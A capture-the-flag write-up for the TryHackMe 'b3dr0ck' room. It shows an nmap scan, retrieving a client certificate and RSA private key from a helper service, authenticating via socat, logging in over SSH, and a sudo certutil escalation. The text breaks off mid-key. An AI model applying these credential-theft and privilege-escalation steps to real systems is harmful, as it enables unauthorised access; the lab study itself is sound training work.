<p align="center">
  THM : b3dr0ck<br>
  Diffictuly : Easy<br>
  <img src="https://i.imgur.com/KZzQXuQ.jpg">
</p>

## Summary

- [Introduction](#introduction)
- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Port 9009 enumeration](#port-9009-enumeration)
- [Port 54321 enumeration](#port-54321-enumeration)
- [Privilege escalation (fred)](#privilege-escalation-fred)
- [Privilege escalation (root)](#privilege-escalation-root)
- [Conclusion](#conclusion)

## Introduction

Here is the statement of this room :  
```
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

- He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
- Can you find all the Easter eggs?
```

## Nmap scan

First, let's use [nmap](https://nmap.org/book/man.html) to scan the target for open ports and services :  
```
attacker@AttackBox:~/b3dr0ck$ cat nmapResults.txt 
# Nmap 7.80 scan initiated Wed Jan 18 13:06:49 2023 as: nmap -A -p- -oN nmapResults.txt 10.10.245.34
Nmap scan report for 10.10.245.34
Host is up (0.068s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.245.34:4040/
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Wed, 18 Jan 2023 12:07:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2023-01-18T12:04:00
|_Not valid after:  2024-01-18T12:04:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2023-01-18T12:04:00
|_Not valid after:  2024-01-18T12:04:00
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.80%T=SSL%I=7%D=1/18%Time=63C7E115%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Wed,\x2018\x20Jan\x202023\x2012:07:49\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Wed,\x2018\x20Jan\x202023\x2012:07:49\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.80%I=7%D=1/18%Time=63C7E104%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.80%T=SSL%I=7%D=1/18%Time=63C7E10A%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(GenericLines,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(GetRequest,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(HTTPOptions,31,"
SF:Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")
SF:%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(RPCCheck,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(DNSVersionBindReqTCP,31,"Error:\x
SF:20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(DNSSt
SF:atusRequestTCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(Help,31,"Error:\x20'undefined'\x20is\x20not\x20au
SF:thorized\x20for\x20access\.\n")%r(SSLSessionReq,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServerCo
SF:okie,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(TLSSessionReq,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20
SF:is\x20not\x20authorized\x20for\x20access\.\n")%r(SMBProgNeg,31,"Error:\
SF:x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(X11P
SF:robe,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(FourOhFourRequest,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(LPDString,31,"Error:\x20'undefined
SF:'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(LDAPSearchReq,31,
SF:"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n"
SF:)%r(LDAPBindReq,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x2
SF:0for\x20access\.\n")%r(SIPOptions,31,"Error:\x20'undefined'\x20is\x20no
SF:t\x20authorized\x20for\x20access\.\n")%r(LANDesk-RC,31,"Error:\x20'unde
SF:fined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServ
SF:er,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acces
SF:s\.\n")%r(NCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20f
SF:or\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 18 13:10:06 2023 -- 1 IP address (1 host up) scanned in 197.75 seconds
```

## Website enumeration

If we try to use a web browser to enumerate port 80, we are redirected to `http://[IP]:4040/` :  
![](https://i.imgur.com/v5EtbEq.jpg)  

There is a message that seems to talk about an open port over 9000.

## Port 9009 enumeration

With nmap, we found that port 9009 was open. Let's use telnet to connect to this port :  
```
attacker@AttackBox:~/b3dr0ck$ telnet 10.10.245.34 9009
Trying 10.10.245.34...
Connected to 10.10.245.34.
Escape character is '^]'.


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for?
```

So we need a certificate and a key to connect to port 54321. Where can we find those two things ?
```
What are you looking for? cert     
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzAxMTgxMjA0MTlaFw0yNDAxMTgxMjA0MTlaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9ywfh
7IxPJY0TahVWfGmSQExiQhYoMyrriIJIo8VWd/6JkIAgBMmEX3WCO88nFb3DgwfJ
agdViJ1N3kv3/klvCcr8NpJS3oJBwsS/9kXXGCXZPhSKpuTRbnfcU4kA1JDTYOSw
iuB5loRfUeIaEN3cbJZY7OLIz98ravv7qJZXQbh0w6nAQe4mqjGseY8bxt/OKaG/
JTNwlw63cjcuokAUJm4cc1W1nWgta/WJ47EGrwLzM0gKEsxvnrCVgNIAttbN/WIA
WnftJkVD9YEukaWvBNYcTrzai0bURQnxw9/zaFSJYGQt439y5+rTU0O+Rk9TKhXU
EX2nuygY1r9Vf/mDAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACb6KZ+Urus531Lm
KN1+1jKUOzVhKi/CAPJt91lPRlO3vdCW3ZIXiCTiBqNcDXTOBgurmr5jqIE1oq8Y
EjCdD6m5ERILymSxDMptl9nAAHc30ZepEY54FqDFxY9L82AgmXquiAGIkzriUQKA
ciDNFVLKih9ZAIK6ynkiDh6VPtIucMyuFQ/xNM6TFV9N7WJS4MKAyvGBvda4OsgT
vmU0XM5VQ5xPOmO/9Jk5ArZTtNC5ogAMaGRuFgujjG8undMfl8mpHB6hJCo5Gd5O
CqsUozIK5HWJdTxbmhTiD1a0KLQxsYDLuxjsw4Mxts1FsGM4Abfxdk9fJdxlnURe
IzYf4OA=
-----END CERTIFICATE----
```

By using the command `cert`, we now have the certificate. We still need the key :  
```
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvcsH4eyMTyWNE2oVVnxpkkBMYkIWKDMq64iCSKPFVnf+iZCA
IATJhF91gjvPJxW9w4MHyWoHVYidTd5L9/5JbwnK/DaSUt6CQcLEv/ZF1xgl2T4U
iqbk0W533FOJANSQ02DksIrgeZaEX1HiGhDd3GyWWOziyM/fK2r7+6iWV0G4dMOp
wEHuJqoxrHmPG8bfzimhvyUzcJcOt3I3LqJAFCZuHHNVtZ1oLWv1ieOxBq8C8zNI
ChLMb56wlYDSALbWzf1iAFp37SZFQ/WBLpGlrwTWHE682otG1EUJ8cPf82hUiWBk
LeN/cufq01NDvkZPUyoV1BF9p7soGNa/VX/5gwIDAQABAoIBABYPvbDTUFP653U0
RZqyB4uKkdZyHCU8HWcXjR1ofA3bEOlotJwEMnCCsCQdU60VZ+OMHaGaA5Q7tx1Q
E8CV/G890iyTI1sipj2CqGAv/lpMYknoX3bmg36cuq4Pv8Mq8lK/1pV27zTy/Bwg
ZonlIAT5Uliv4IS7NRPU8cmFBUTLGT4PITOQncBRdDItmPtao4TFBuncX1sy/ppS
xTBEVZH61sVqVToQjWFPQlPQmTilen2TdM4lhVocCtN6D0TTPVKMEkctbHFSoCag
MAByGpS9jOZkWWl0hpjs+vfA5VTzNnN18DlkpiF7M4piku4Fh37R5GSatUW/FTGG
LQ2AclECgYEA+nQmMVvwJMUeaeoA/71lz2bo1WrKPNWJfsOBSfiBbAGpaTiPdhU4
g25ig/HGgRDGFm98cnThJcv7GyAl+NxI5VP10eWkQVyzvWeEfeLJQzdzbNTQH50V
Wp/H43+SkkZBZ8SS+/xtX4XSlFNhgiYyjvQEuywyjT0Yq1/qf21zH00CgYEAwf79
VePjhO493hXicVyCknkcyN87zfVe0y9gCjYChcNNV671mF8S+/AlNp2YFAbj6YWZ
DDy8UgkCybI3eJmgE48WHpz5KpNvl1gpjGGwfaiPI2IzrriXDhjQFwfOEOylgABn
ZNrvDNWVIrIC6uhgdBPTLwUv/2OQ2MdTqk87tA8CgYAo2j1Im9iGBuk5GYRkMr6i
oASmmy610ZcF6Fn0eOaTeYnqseEkv71iIuVK5Gserl/BVRoViV8YTTd+azYGa9gw
IAve2vh5+OcQpAwGhLGTlz3qqKPyJCtRhvKR90MvPOp6RKQ9GiW1CR0aOKeVFSn2
C3OiHEl6pFabzZ9wfafjmQKBgQCJ/bAEHWLkVnbpd1WoXy59s+qWs7udh/DYdXVy
LfLjZQWp3kjSBqbBUJOX4sefTztlC2PPQZCPJdu2zq8IePZVk00fn3bZIyCYXdzH
/2EEMRcICz1KBgFkxJ+YEjQw87PRdfgV1GmADpjToh3TLFIXn1ZzttPqbM9Gc5p+
pXeJXwKBgQDw54ekaV0OZBh8eMV9EuzKVHzwQ4HwaK7xjHL+H1tD0uK8XzeTk91A
J3+k6CLQj2UtgOPGPivbhxzfInVyZJQdZI6UZSMPUfNZst+27epyvLmG8hm94ljL
yUCUEJsRVMbBi1YvwpLa802HHYSOFJ9I0TFJdkyev+mpmf3LT7ClGw==
-----END RSA PRIVATE KEY-----
```

Now we have both the private key and the certificate ! First, let's save the private key and the certificate in a file :  
```
attacker@AttackBox:~/b3dr0ck$ cat key.txt 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvcsH4eyMTyWNE2oVVnxpkkBMYkIWKDMq64iCSKPFVnf+iZCA
IATJhF91gjvPJxW9w4MHyWoHVYidTd5L9/5JbwnK/DaSUt6CQcLEv/ZF1xgl2T4U
iqbk0W533FOJANSQ02DksIrgeZaEX1HiGhDd3GyWWOziyM/fK2r7+6iWV0G4dMOp
wEHuJqoxrHmPG8bfzimhvyUzcJcOt3I3LqJAFCZuHHNVtZ1oLWv1ieOxBq8C8zNI
ChLMb56wlYDSALbWzf1iAFp37SZFQ/WBLpGlrwTWHE682otG1EUJ8cPf82hUiWBk
LeN/cufq01NDvkZPUyoV1BF9p7soGNa/VX/5gwIDAQABAoIBABYPvbDTUFP653U0
RZqyB4uKkdZyHCU8HWcXjR1ofA3bEOlotJwEMnCCsCQdU60VZ+OMHaGaA5Q7tx1Q
E8CV/G890iyTI1sipj2CqGAv/lpMYknoX3bmg36cuq4Pv8Mq8lK/1pV27zTy/Bwg
ZonlIAT5Uliv4IS7NRPU8cmFBUTLGT4PITOQncBRdDItmPtao4TFBuncX1sy/ppS
xTBEVZH61sVqVToQjWFPQlPQmTilen2TdM4lhVocCtN6D0TTPVKMEkctbHFSoCag
MAByGpS9jOZkWWl0hpjs+vfA5VTzNnN18DlkpiF7M4piku4Fh37R5GSatUW/FTGG
LQ2AclECgYEA+nQmMVvwJMUeaeoA/71lz2bo1WrKPNWJfsOBSfiBbAGpaTiPdhU4
g25ig/HGgRDGFm98cnThJcv7GyAl+NxI5VP10eWkQVyzvWeEfeLJQzdzbNTQH50V
Wp/H43+SkkZBZ8SS+/xtX4XSlFNhgiYyjvQEuywyjT0Yq1/qf21zH00CgYEAwf79
VePjhO493hXicVyCknkcyN87zfVe0y9gCjYChcNNV671mF8S+/AlNp2YFAbj6YWZ
DDy8UgkCybI3eJmgE48WHpz5KpNvl1gpjGGwfaiPI2IzrriXDhjQFwfOEOylgABn
ZNrvDNWVIrIC6uhgdBPTLwUv/2OQ2MdTqk87tA8CgYAo2j1Im9iGBuk5GYRkMr6i
oASmmy610ZcF6Fn0eOaTeYnqseEkv71iIuVK5Gserl/BVRoViV8YTTd+azYGa9gw
IAve2vh5+OcQpAwGhLGTlz3qqKPyJCtRhvKR90MvPOp6RKQ9GiW1CR0aOKeVFSn2
C3OiHEl6pFabzZ9wfafjmQKBgQCJ/bAEHWLkVnbpd1WoXy59s+qWs7udh/DYdXVy
LfLjZQWp3kjSBqbBUJOX4sefTztlC2PPQZCPJdu2zq8IePZVk00fn3bZIyCYXdzH
/2EEMRcICz1KBgFkxJ+YEjQw87PRdfgV1GmADpjToh3TLFIXn1ZzttPqbM9Gc5p+
pXeJXwKBgQDw54ekaV0OZBh8eMV9EuzKVHzwQ4HwaK7xjHL+H1tD0uK8XzeTk91A
J3+k6CLQj2UtgOPGPivbhxzfInVyZJQdZI6UZSMPUfNZst+27epyvLmG8hm94ljL
yUCUEJsRVMbBi1YvwpLa802HHYSOFJ9I0TFJdkyev+mpmf3LT7ClGw==
-----END RSA PRIVATE KEY-----
attacker@AttackBox:~/b3dr0ck$ cat cert.txt 
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzAxMTgxMjA0MTlaFw0yNDAxMTgxMjA0MTlaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9ywfh
7IxPJY0TahVWfGmSQExiQhYoMyrriIJIo8VWd/6JkIAgBMmEX3WCO88nFb3DgwfJ
agdViJ1N3kv3/klvCcr8NpJS3oJBwsS/9kXXGCXZPhSKpuTRbnfcU4kA1JDTYOSw
iuB5loRfUeIaEN3cbJZY7OLIz98ravv7qJZXQbh0w6nAQe4mqjGseY8bxt/OKaG/
JTNwlw63cjcuokAUJm4cc1W1nWgta/WJ47EGrwLzM0gKEsxvnrCVgNIAttbN/WIA
WnftJkVD9YEukaWvBNYcTrzai0bURQnxw9/zaFSJYGQt439y5+rTU0O+Rk9TKhXU
EX2nuygY1r9Vf/mDAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACb6KZ+Urus531Lm
KN1+1jKUOzVhKi/CAPJt91lPRlO3vdCW3ZIXiCTiBqNcDXTOBgurmr5jqIE1oq8Y
EjCdD6m5ERILymSxDMptl9nAAHc30ZepEY54FqDFxY9L82AgmXquiAGIkzriUQKA
ciDNFVLKih9ZAIK6ynkiDh6VPtIucMyuFQ/xNM6TFV9N7WJS4MKAyvGBvda4OsgT
vmU0XM5VQ5xPOmO/9Jk5ArZTtNC5ogAMaGRuFgujjG8undMfl8mpHB6hJCo5Gd5O
CqsUozIK5HWJdTxbmhTiD1a0KLQxsYDLuxjsw4Mxts1FsGM4Abfxdk9fJdxlnURe
IzYf4OA=
-----END CERTIFICATE----
```

## Port 54321 enumeration

Now we can try to use them to connect on port 54321 :  
```
attacker@AttackBox:~/b3dr0ck$ socat stdio ssl:10.10.245.34:54321,cert=cert.txt,key=key.txt,verify=0
2023/01/18 13:29:35 socat[4201] E SSL_CTX_use_certificate_file(): error:0908F066:PEM routines:get_header_and_data:bad end line
```

After some research, this can happen when there is a `-` missing at the end of the certificate. I used `nano`, and yes, there was a `-` missing at the very end of 
the file. So let's try again now :  
```
attacker@AttackBox:~/b3dr0ck$ socat stdio ssl:10.10.245.34:54321,cert=cert.txt,key=key.txt,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> ls  
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck>
```

So now we have somthing that looks like a password hash. But if we just use the password hint as password to login on SSH as `barney` :  
```
attacker@AttackBox:~/b3dr0ck$ ssh barney@10.10.245.34
barney@10.10.245.34's password: 
barney@b3dr0ck:~$
```

We are logged in as `barney` ! Let's get the `barney.txt` flag :  
```
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{********************************}
```

**Question : What is the barney.txt flag ?**  
**Answer : THM{*HIDDEN*}**  

## Privilege escalation (fred)

Let's see our sudo rights :  
```
barney@b3dr0ck:~$ sudo -l
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certuti
```

So let's try to run `/usr/bin/certutil` with sudo : 
```
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:~$ sudo /usr/bin/certutil fred "Fred Rubble"
Generating credentials for user: fred (Fred Rubble)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvoJRijlWNdasylNH30gYlbJNjZOoNZwNJ894p4VFWPcfI7fQ
fc9kvrD/EF0Pk1FpCVen0W6unpoyugse+pO1aNzdoVdGu7cZxv/2fVJQv9u3Pf6J
xgg9WoqiHaTBw3+gtK/BRJNpDf/YJ9Zi6rj5YRVfaw2TLtOIdVL97tI2HlWnzmGO
